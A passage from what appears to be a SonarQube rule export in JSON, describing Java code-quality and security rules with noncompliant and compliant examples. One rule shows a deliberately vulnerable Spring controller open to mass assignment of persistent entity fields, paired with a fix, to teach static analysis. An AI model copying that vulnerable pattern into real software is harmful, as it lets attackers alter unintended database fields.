            "mdDesc": "<p>When an inner class extends another class, and both its outer class and its parent class have a method with the same name, calls to that method can\nbe confusing. The compiler will resolve the call to the superclass method, but maintainers may be confused, so the superclass method should be called\nexplicitly, using <code>super.</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Parent {\n  public void foo() { ... }\n}\n\npublic class Outer {\n\n  public void foo() { ... }\n\n  public class Inner extends Parent {\n\n    public void doTheThing() {\n      foo();  // Noncompliant; was Outer.this.foo() intended instead?\n      // ...\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Parent {\n  public void foo() { ... }\n}\n\npublic class Outer {\n\n  public void foo() { ... }\n\n  public class Inner extends Parent {\n\n    public void doTheThing() {\n      super.foo();\n      // ...\n    }\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3599",
            "repo": "java",
            "name": "Double Brace Initialization should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Because Double Brace Initialization (DBI) creates an anonymous class with a reference to the instance of the owning object, its use can lead to\nmemory leaks if the anonymous inner class is returned and held by other objects. Even when there's no leak, DBI is so obscure that it's bound to\nconfuse most maintainers. </p>\n<p>For collections, use <code>Arrays.asList</code> instead, or explicitly add each item directly to the collection.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nMap source = new HashMap(){{ // Noncompliant\n    put(\"firstName\", \"John\");\n    put(\"lastName\", \"Smith\");\n}};\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nMap source = new HashMap();\n// ...\nsource.put(\"firstName\", \"John\");\nsource.put(\"lastName\", \"Smith\");\n// ...\n</pre>",
            "mdDesc": "<p>Because Double Brace Initialization (DBI) creates an anonymous class with a reference to the instance of the owning object, its use can lead to\nmemory leaks if the anonymous inner class is returned and held by other objects. Even when there's no leak, DBI is so obscure that it's bound to\nconfuse most maintainers. </p>\n<p>For collections, use <code>Arrays.asList</code> instead, or explicitly add each item directly to the collection.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nMap source = new HashMap(){{ // Noncompliant\n    put(\"firstName\", \"John\");\n    put(\"lastName\", \"Smith\");\n}};\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nMap source = new HashMap();\n// ...\nsource.put(\"firstName\", \"John\");\nsource.put(\"lastName\", \"Smith\");\n// ...\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "leak"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S5778",
            "repo": "java",
            "name": "Only one method invocation is expected when testing runtime exceptions",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When verifying that code raises a runtime exception, a good practice is to avoid having multiple method calls inside the tested code, to be\nexplicit about which method call is expected to raise the exception.</p>\n<p>It increases the clarity of the test, and avoid incorrect testing when another method is actually raising the exception.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void testToString() {\n  // Do you expect get() or toString() throwing the exception?\n  org.junit.Assert.assertThrows(IndexOutOfBoundsException.class, () -&gt; get().toString());\n}\n\n@Test\npublic void testToStringTryCatchIdiom() {\n  try {\n    // Do you expect get() or toString() throwing the exception?\n    get().toString();\n    Assert.fail(\"Expected an IndexOutOfBoundsException to be thrown\");\n  } catch (IndexOutOfBoundsException e) {\n    // Test exception message...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void testToString() {\n   Object obj = get();\n   Assert.assertThrows(IndexOutOfBoundsException.class, () -&gt; obj.toString());\n}\n\n@Test\npublic void testToStringTryCatchIdiom() {\n  Object obj = get();\n  try {\n    obj.toString();\n    Assert.fail(\"Expected an IndexOutOfBoundsException to be thrown\");\n  } catch (IndexOutOfBoundsException e) {\n    // Test exception message...\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing\">JUnit exception testing documentation</a> </li>\n</ul>",
            "mdDesc": "<p>When verifying that code raises a runtime exception, a good practice is to avoid having multiple method calls inside the tested code, to be\nexplicit about which method call is expected to raise the exception.</p>\n<p>It increases the clarity of the test, and avoid incorrect testing when another method is actually raising the exception.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void testToString() {\n  // Do you expect get() or toString() throwing the exception?\n  org.junit.Assert.assertThrows(IndexOutOfBoundsException.class, () -&gt; get().toString());\n}\n\n@Test\npublic void testToStringTryCatchIdiom() {\n  try {\n    // Do you expect get() or toString() throwing the exception?\n    get().toString();\n    Assert.fail(\"Expected an IndexOutOfBoundsException to be thrown\");\n  } catch (IndexOutOfBoundsException e) {\n    // Test exception message...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void testToString() {\n   Object obj = get();\n   Assert.assertThrows(IndexOutOfBoundsException.class, () -&gt; obj.toString());\n}\n\n@Test\npublic void testToStringTryCatchIdiom() {\n  Object obj = get();\n  try {\n    obj.toString();\n    Assert.fail(\"Expected an IndexOutOfBoundsException to be thrown\");\n  } catch (IndexOutOfBoundsException e) {\n    // Test exception message...\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://github.com/junit-team/junit4/wiki/Exception-testing\">JUnit exception testing documentation</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2147",
            "repo": "java",
            "name": "Catches should be combined",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Since Java 7 it has been possible to catch multiple exceptions at once. Therefore, when multiple <code>catch</code> blocks have the same code, they\nshould be combined for better readability.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ncatch (IOException e) {\n  doCleanup();\n  logger.log(e);\n}\ncatch (SQLException e) {  // Noncompliant\n  doCleanup();\n  logger.log(e);\n}\ncatch (TimeoutException e) {  // Compliant; block contents are different\n  doCleanup();\n  throw e;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ncatch (IOException|SQLException e) {\n  doCleanup();\n  logger.log(e);\n}\ncatch (TimeoutException e) {\n  doCleanup();\n  throw e;\n}\n</pre>",
            "mdDesc": "<p>Since Java 7 it has been possible to catch multiple exceptions at once. Therefore, when multiple <code>catch</code> blocks have the same code, they\nshould be combined for better readability.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ncatch (IOException e) {\n  doCleanup();\n  logger.log(e);\n}\ncatch (SQLException e) {  // Noncompliant\n  doCleanup();\n  logger.log(e);\n}\ncatch (TimeoutException e) {  // Compliant; block contents are different\n  doCleanup();\n  throw e;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ncatch (IOException|SQLException e) {\n  doCleanup();\n  logger.log(e);\n}\ncatch (TimeoutException e) {\n  doCleanup();\n  throw e;\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2386",
            "repo": "java",
            "name": "Mutable fields should not be \"public static\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There is no good reason to have a mutable object as the <code>public</code> (by default), <code>static</code> member of an <code>interface</code>.\nSuch variables should be moved into classes and their visibility lowered. </p>\n<p>Similarly, mutable <code>static</code> members of classes and enumerations which are accessed directly, rather than through getters and setters,\nshould be protected to the degree possible. That can be done by reducing visibility or making the field <code>final</code> if appropriate. </p>\n<p>Note that making a mutable field, such as an array, <code>final</code> will keep the variable from being reassigned, but doing so has no effect on\nthe mutability of the internal state of the array (i.e. it doesn't accomplish the goal).</p>\n<p>This rule raises issues for <code>public static</code> array, <code>Collection</code>, <code>Date</code>, and <code>awt.Point</code> members.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface MyInterface {\n  public static String [] strings; // Noncompliant\n}\n\npublic class A {\n  public static String [] strings1 = {\"first\",\"second\"};  // Noncompliant\n  public static String [] strings2 = {\"first\",\"second\"};  // Noncompliant\n  public static List&lt;String&gt; strings3 = new ArrayList&lt;&gt;();  // Noncompliant\n  // ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/582.html\">MITRE, CWE-582</a> - Array Declared Public, Final, and Static </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/607.html\">MITRE, CWE-607</a> - Public Static Final Field References Mutable Object </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/LjdGBQ\">CERT, OBJ01-J.</a> - Limit accessibility of fields </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/VzZGBQ\">CERT, OBJ13-J.</a> - Ensure that references to mutable objects are not exposed </li>\n</ul>",
            "mdDesc": "<p>There is no good reason to have a mutable object as the <code>public</code> (by default), <code>static</code> member of an <code>interface</code>.\nSuch variables should be moved into classes and their visibility lowered. </p>\n<p>Similarly, mutable <code>static</code> members of classes and enumerations which are accessed directly, rather than through getters and setters,\nshould be protected to the degree possible. That can be done by reducing visibility or making the field <code>final</code> if appropriate. </p>\n<p>Note that making a mutable field, such as an array, <code>final</code> will keep the variable from being reassigned, but doing so has no effect on\nthe mutability of the internal state of the array (i.e. it doesn't accomplish the goal).</p>\n<p>This rule raises issues for <code>public static</code> array, <code>Collection</code>, <code>Date</code>, and <code>awt.Point</code> members.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface MyInterface {\n  public static String [] strings; // Noncompliant\n}\n\npublic class A {\n  public static String [] strings1 = {\"first\",\"second\"};  // Noncompliant\n  public static String [] strings2 = {\"first\",\"second\"};  // Noncompliant\n  public static List&lt;String&gt; strings3 = new ArrayList&lt;&gt;();  // Noncompliant\n  // ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/582.html\">MITRE, CWE-582</a> - Array Declared Public, Final, and Static </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/607.html\">MITRE, CWE-607</a> - Public Static Final Field References Mutable Object </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/LjdGBQ\">CERT, OBJ01-J.</a> - Limit accessibility of fields </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/VzZGBQ\">CERT, OBJ13-J.</a> - Ensure that references to mutable objects are not exposed </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "unpredictable"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4684",
            "repo": "java",
            "name": "Persistent entities should not be used as arguments of \"@RequestMapping\" methods",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>On one side, Spring MVC automatically bind request parameters to beans declared as arguments of methods annotated with\n<code>@RequestMapping</code>. Because of this automatic binding feature, it's possible to feed some unexpected fields on the arguments of the\n<code>@RequestMapping</code> annotated methods. </p>\n<p>On the other end, persistent objects (<code>@Entity</code> or <code>@Document</code>) are linked to the underlying database and updated\nautomatically by a persistence framework, such as Hibernate, JPA or Spring Data MongoDB.</p>\n<p>These two facts combined together can lead to malicious attack: if a persistent object is used as an argument of a method annotated with\n<code>@RequestMapping</code>, it's possible from a specially crafted user input, to change the content of unexpected fields into the database.</p>\n<p>For this reason, using <code>@Entity</code> or <code>@Document</code> objects as arguments of methods annotated with <code>@RequestMapping</code>\nshould be avoided.</p>\n<p>In addition to <code>@RequestMapping</code>, this rule also considers the annotations introduced in Spring Framework 4.3: <code>@GetMapping</code>,\n<code>@PostMapping</code>, <code>@PutMapping</code>, <code>@DeleteMapping</code>, <code>@PatchMapping</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport javax.persistence.Entity;\n\n@Entity\npublic class Wish {\n  Long productId;\n  Long quantity;\n  Client client;\n}\n\n@Entity\npublic class Client {\n  String clientId;\n  String name;\n  String password;\n}\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n@Controller\npublic class WishListController {\n\n  @PostMapping(path = \"/saveForLater\")\n  public String saveForLater(Wish wish) {\n    session.save(wish);\n  }\n\n  @RequestMapping(path = \"/saveForLater\", method = RequestMethod.POST)\n  public String saveForLater(Wish wish) {\n    session.save(wish);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class WishDTO {\n  Long productId;\n  Long quantity;\n  Long clientId;\n}\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n@Controller\npublic class PurchaseOrderController {\n\n  @PostMapping(path = \"/saveForLater\")\n  public String saveForLater(WishDTO wish) {\n    Wish persistentWish = new Wish();\n    // do the mapping between \"wish\" and \"persistentWish\"\n    [...]\n    session.save(persistentWish);\n  }\n\n  @RequestMapping(path = \"/saveForLater\", method = RequestMethod.POST)\n  public String saveForLater(WishDTO wish) {\n    Wish persistentWish = new Wish();\n    // do the mapping between \"wish\" and \"persistentWish\"\n    [...]\n    session.save(persistentWish);\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported when the parameter is annotated with <code>@PathVariable</code> from Spring Framework, since the lookup will be done via id,\nthe object cannot be forged on client side.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control\">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/915.html\">MITRE, CWE-915</a> - Improperly Controlled Modification of Dynamically-Determined\n  Object Attributes </li>\n  <li> <a href=\"https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf\">Two Security Vulnerabilities in the Spring\n  Framework’s MVC by Ryan Berg and Dinis Cruz</a> </li>\n</ul>",
            "mdDesc": "<p>On one side, Spring MVC automatically bind request parameters to beans declared as arguments of methods annotated with\n<code>@RequestMapping</code>. Because of this automatic binding feature, it's possible to feed some unexpected fields on the arguments of the\n<code>@RequestMapping</code> annotated methods. </p>\n<p>On the other end, persistent objects (<code>@Entity</code> or <code>@Document</code>) are linked to the underlying database and updated\nautomatically by a persistence framework, such as Hibernate, JPA or Spring Data MongoDB.</p>\n<p>These two facts combined together can lead to malicious attack: if a persistent object is used as an argument of a method annotated with\n<code>@RequestMapping</code>, it's possible from a specially crafted user input, to change the content of unexpected fields into the database.</p>\n<p>For this reason, using <code>@Entity</code> or <code>@Document</code> objects as arguments of methods annotated with <code>@RequestMapping</code>\nshould be avoided.</p>\n<p>In addition to <code>@RequestMapping</code>, this rule also considers the annotations introduced in Spring Framework 4.3: <code>@GetMapping</code>,\n<code>@PostMapping</code>, <code>@PutMapping</code>, <code>@DeleteMapping</code>, <code>@PatchMapping</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nimport javax.persistence.Entity;\n\n@Entity\npublic class Wish {\n  Long productId;\n  Long quantity;\n  Client client;\n}\n\n@Entity\npublic class Client {\n  String clientId;\n  String name;\n  String password;\n}\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n@Controller\npublic class WishListController {\n\n  @PostMapping(path = \"/saveForLater\")\n  public String saveForLater(Wish wish) {\n    session.save(wish);\n  }\n\n  @RequestMapping(path = \"/saveForLater\", method = RequestMethod.POST)\n  public String saveForLater(Wish wish) {\n    session.save(wish);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class WishDTO {\n  Long productId;\n  Long quantity;\n  Long clientId;\n}\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n@Controller\npublic class PurchaseOrderController {\n\n  @PostMapping(path = \"/saveForLater\")\n  public String saveForLater(WishDTO wish) {\n    Wish persistentWish = new Wish();\n    // do the mapping between \"wish\" and \"persistentWish\"\n    [...]\n    session.save(persistentWish);\n  }\n\n  @RequestMapping(path = \"/saveForLater\", method = RequestMethod.POST)\n  public String saveForLater(WishDTO wish) {\n    Wish persistentWish = new Wish();\n    // do the mapping between \"wish\" and \"persistentWish\"\n    [...]\n    session.save(persistentWish);\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported when the parameter is annotated with <code>@PathVariable</code> from Spring Framework, since the lookup will be done via id,\nthe object cannot be forged on client side.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control\">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/915.html\">MITRE, CWE-915</a> - Improperly Controlled Modification of Dynamically-Determined\n  Object Attributes </li>\n  <li> <a href=\"https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf\">Two Security Vulnerabilities in the Spring\n  Framework’s MVC by Ryan Berg and Dinis Cruz</a> </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a5",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S3355",
            "repo": "java",
            "name": "Defined filters should be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Every filter defined in <code>web.xml</code> file should be used in a <code>&lt;filter-mapping&gt;</code> element. Otherwise such filters are not\ninvoked.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n  &lt;filter&gt;\n     &lt;filter-name&gt;DefinedNotUsed&lt;/filter-name&gt;\n     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;\n  &lt;/filter&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n  &lt;filter&gt;\n     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;\n     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;\n  &lt;/filter&gt;\n\n  &lt;filter-mapping&gt;\n     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;\n     &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n  &lt;/filter-mapping&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n</ul>",
            "mdDesc": "<p>Every filter defined in <code>web.xml</code> file should be used in a <code>&lt;filter-mapping&gt;</code> element. Otherwise such filters are not\ninvoked.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n  &lt;filter&gt;\n     &lt;filter-name&gt;DefinedNotUsed&lt;/filter-name&gt;\n     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;\n  &lt;/filter&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n  &lt;filter&gt;\n     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;\n     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;\n  &lt;/filter&gt;\n\n  &lt;filter-mapping&gt;\n     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;\n     &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n  &lt;/filter-mapping&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "owasp-a6"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S1176",
            "repo": "java",
            "name": "Public types, methods and fields (API) should be documented with Javadoc",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Try to imagine using the standard Java API (Collections, JDBC, IO, ...) without Javadoc. It would be a nightmare, because Javadoc is the only way\nto understand of the contract of the API. Documenting an API with Javadoc increases the productivity of the developers consuming it.</p>\n<p>On top of a main description for each member of a public API, the following Javadoc elements are required to be described:</p>\n<ul>\n  <li> Parameters, using <code>@param parameterName</code>. </li>\n  <li> Thrown exceptions, using <code>@throws exceptionName</code>. </li>\n  <li> Method return values, using <code>@return</code>. </li>\n  <li> Generic types, using <code>@param &lt;T&gt;</code>. </li>\n</ul>\n<p>Furthermore the following guidelines should be followed:</p>\n<ul>\n  <li> At least 1 line of description. </li>\n  <li> All parameters documented with <code>@param</code>, and names should match. </li>\n  <li> All checked exceptions documented with <code>@throws</code> </li>\n  <li> <code>@return</code> present and documented when not <code>void</code>. </li>\n  <li> Placeholders like \"TODO\", \"FIXME\", \"...\" should be avoided. </li>\n</ul>\n<p>The following public methods and constructors are not taken into account by this rule:</p>\n<ul>\n  <li> Getters and setters. </li>\n  <li> Methods overriding another method (usually decorated with <code>@Override</code>). </li>\n  <li> Empty constructors. </li>\n  <li> Static constants. </li>\n</ul>\n<p>For the parameters of the rule, the following rules are applied:</p>\n<ul>\n  <li> <code>?</code> matches a single character </li>\n  <li> <code>*</code> matches zero or more characters </li>\n  <li> <code>**</code> matches zero or more packages </li>\n</ul>\n<p>Examples:</p>\n<ul>\n  <li> <code>java.internal.InternalClass</code> will match only <code>InternalClass</code> class. </li>\n  <li> <code>java.internal.*</code> will match any member of <code>java.internal</code> package. </li>\n  <li> <code>java.internal.**</code> same as above, but including sub-packages. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\n/**\n  * This is a Javadoc comment\n  */\npublic class MyClass&lt;T&gt; implements Runnable {    // Noncompliant - missing '@param &lt;T&gt;'\n\n  public static final DEFAULT_STATUS = 0;    // Compliant - static constant\n  private int status;                           // Compliant - not public\n\n  public String message;                  // Noncompliant\n\n  public MyClass() {                         // Noncompliant - missing documentation\n    this.status = DEFAULT_STATUS;\n  }\n\n  public void setStatus(int status) {  // Compliant - setter\n    this.status = status;\n  }\n\n  @Override\n  public void run() {                          // Compliant - has @Override annotation\n  }\n\n  protected void doSomething() {    // Compliant - not public\n  }\n\n  public void doSomething2(int value) {  // Noncompliant\n  }\n\n  public int doSomething3(int value) {  // Noncompliant\n    return value;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n/**\n  * This is a Javadoc comment\n  * @param &lt;T&gt; the parameter of the class\n  */\npublic class MyClass&lt;T&gt; implements Runnable {\n\n  public static final DEFAULT_STATUS = 0;\n  private int status;\n\n  /**\n    * This is a Javadoc comment\n    */\n  public String message;\n\n  /**\n   * Class comment...\n   */\n  public MyClass() {\n    this.status = DEFAULT_STATUS;\n  }\n\n  public void setStatus(int status) {\n    this.status = status;\n  }\n\n  @Override\n  public void run() {\n  }\n\n  protected void doSomething() {\n  }\n\n  /**\n    * Will do something.\n    * @param value the value to be used\n    */\n  public void doSomething(int value) {\n\n  /**\n    *  {@inheritDoc}\n    */\n  public int doSomething(int value) {\n    return value;\n  }\n}\n</pre>",
            "mdDesc": "<p>Try to imagine using the standard Java API (Collections, JDBC, IO, ...) without Javadoc. It would be a nightmare, because Javadoc is the only way\nto understand of the contract of the API. Documenting an API with Javadoc increases the productivity of the developers consuming it.</p>\n<p>On top of a main description for each member of a public API, the following Javadoc elements are required to be described:</p>\n<ul>\n  <li> Parameters, using <code>@param parameterName</code>. </li>\n  <li> Thrown exceptions, using <code>@throws exceptionName</code>. </li>\n  <li> Method return values, using <code>@return</code>. </li>\n  <li> Generic types, using <code>@param &lt;T&gt;</code>. </li>\n</ul>\n<p>Furthermore the following guidelines should be followed:</p>\n<ul>\n  <li> At least 1 line of description. </li>\n  <li> All parameters documented with <code>@param</code>, and names should match. </li>\n  <li> All checked exceptions documented with <code>@throws</code> </li>\n  <li> <code>@return</code> present and documented when not <code>void</code>. </li>\n  <li> Placeholders like \"TODO\", \"FIXME\", \"...\" should be avoided. </li>\n</ul>\n<p>The following public methods and constructors are not taken into account by this rule:</p>\n<ul>\n  <li> Getters and setters. </li>\n  <li> Methods overriding another method (usually decorated with <code>@Override</code>). </li>\n  <li> Empty constructors. </li>\n  <li> Static constants. </li>\n</ul>\n<p>For the parameters of the rule, the following rules are applied:</p>\n<ul>\n  <li> <code>?</code> matches a single character </li>\n  <li> <code>*</code> matches zero or more characters </li>\n  <li> <code>**</code> matches zero or more packages </li>\n</ul>\n<p>Examples:</p>\n<ul>\n  <li> <code>java.internal.InternalClass</code> will match only <code>InternalClass</code> class. </li>\n  <li> <code>java.internal.*</code> will match any member of <code>java.internal</code> package. </li>\n  <li> <code>java.internal.**</code> same as above, but including sub-packages. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\n/**\n  * This is a Javadoc comment\n  */\npublic class MyClass&lt;T&gt; implements Runnable {    // Noncompliant - missing '@param &lt;T&gt;'\n\n  public static final DEFAULT_STATUS = 0;    // Compliant - static constant\n  private int status;                           // Compliant - not public\n\n  public String message;                  // Noncompliant\n\n  public MyClass() {                         // Noncompliant - missing documentation\n    this.status = DEFAULT_STATUS;\n  }\n\n  public void setStatus(int status) {  // Compliant - setter\n    this.status = status;\n  }\n\n  @Override\n  public void run() {                          // Compliant - has @Override annotation\n  }\n\n  protected void doSomething() {    // Compliant - not public\n  }\n\n  public void doSomething2(int value) {  // Noncompliant\n  }\n\n  public int doSomething3(int value) {  // Noncompliant\n    return value;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n/**\n  * This is a Javadoc comment\n  * @param &lt;T&gt; the parameter of the class\n  */\npublic class MyClass&lt;T&gt; implements Runnable {\n\n  public static final DEFAULT_STATUS = 0;\n  private int status;\n\n  /**\n    * This is a Javadoc comment\n    */\n  public String message;\n\n  /**\n   * Class comment...\n   */\n  public MyClass() {\n    this.status = DEFAULT_STATUS;\n  }\n\n  public void setStatus(int status) {\n    this.status = status;\n  }\n\n  @Override\n  public void run() {\n  }\n\n  protected void doSomething() {\n  }\n\n  /**\n    * Will do something.\n    * @param value the value to be used\n    */\n  public void doSomething(int value) {\n\n  /**\n    *  {@inheritDoc}\n    */\n  public int doSomething(int value) {\n    return value;\n  